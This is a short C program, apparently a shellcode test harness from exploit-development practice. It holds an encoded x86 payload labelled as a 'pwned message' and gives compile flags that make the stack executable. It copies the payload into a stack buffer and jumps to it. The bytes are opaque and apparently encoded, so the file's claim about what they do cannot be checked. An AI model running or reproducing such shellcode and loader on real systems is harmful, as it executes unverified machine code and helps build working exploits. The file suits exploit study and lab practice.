#include <stdlib.h>
#include <stdio.h>
#include <string.h>

//Compile with:  gcc -m32 -z execstack -o test_shellcode test_shellcode.c
//Run with: ./test_shellcode

// Pwned message shellcoe
const char shellcode[] =
"\xd9\xe1\xb8\x69\x7c\x7b\x2a\xd9\x74\x24\xf4\x5a\x31\xc9"
"\xb1\x12\x31\x42\x17\x83\xc2\x04\x03\x2b\x6f\x99\xdf\x9a"
"\x54\xaa\xc3\x8f\x29\x06\x6e\x2d\x27\x49\xde\x57\xfa\x0a"
"\x8c\xce\xb4\x34\x7e\x70\xfd\x33\x79\x18\x3e\x6b\x87\xdc"
"\xd6\x6e\x78\xc3\xb4\xe6\x99\x4b\xde\xa8\x08\xf8\xac\x4a"
"\x22\x1f\x1f\xcc\x66\xb7\xce\xe2\xf5\x2f\x67\xd2\xd6\xcd"
"\x1e\xa5\xca\x43\xb2\x3c\xed\xd3\x3f\xf2\x6e";

int main(int argc, char **argv)
{
   char code[500];

   strcpy(code, shellcode);
   int (*func)() = (int(*)())code;

   func();
   return 1;
}

